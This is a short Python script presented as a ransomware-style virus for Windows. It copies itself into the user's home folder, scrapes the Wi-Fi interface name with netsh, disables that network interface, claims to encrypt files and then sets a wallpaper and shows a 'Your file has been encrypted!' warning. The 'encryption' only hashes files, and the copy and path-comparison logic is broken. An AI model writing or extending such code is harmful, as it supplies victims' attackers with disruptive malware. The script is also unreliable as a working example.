import shutil
import os
import hashlib
import ctypes
import subprocess, re


main_file_directory = os.getcwd()
user_name = os.getenv('username')
destination_directory = "C://Users//" + user_name
destination_directory_under = destination_directory
sha_256 = hashlib.sha256


def warning():
    wall_paper_file = "bg.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_paper_file , 3)
    ctypes.windll.user32.MessageBoxW(0, "Your file has been encrypted!", "Warning", 0)

def encryption(file_list):
    h  = hashlib.sha256()
    b  = bytearray(128*1024)
    mv = memoryview(b)
    for filename in file_list:
        with open(filename, 'rb', buffering=0) as f:
            for n in iter(lambda : f.readinto(mv), 0):
                h.update(mv[:n])
def wifi_scraper():
    ssid = re.search('(?<=: ).*', re.search(r'(?<=\n) *SSID.*(?=\r\n)', subprocess.check_output('netsh wlan show interfaces', creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')).group()).group()
    return ssid

if main_file_directory is not destination_directory:
    shutil.copy(main_file_directory,destination_directory)
    exit()

elif main_file_directory is destination_directory:
    #start infecting the virus
    sub_directory_list = os.listdir()
    wifi = wifi_scraper()
    try:
        os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")
        encryption(sub_directory_list)
        warning()
    except:
        pass
